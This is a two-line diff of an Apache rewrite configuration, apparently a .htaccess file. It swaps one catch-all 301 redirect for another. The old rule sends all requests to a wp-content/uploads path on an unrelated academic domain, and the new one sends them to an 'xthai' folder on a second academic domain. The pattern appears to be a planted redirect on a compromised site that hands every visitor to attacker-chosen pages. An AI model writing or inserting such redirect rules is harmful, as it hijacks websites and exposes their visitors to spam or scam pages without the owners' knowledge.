@@ -1,2 +1,2 @@
 RewriteEngine on
-RewriteRule ^(.*)$ https://pai.assunnah.ac.id/wp-content/uploads/2024/05/$1 [R=301,L]
+RewriteRule ^(.*)$ https://sdm.poliupg.ac.id/xthai/$1 [R=301,L]
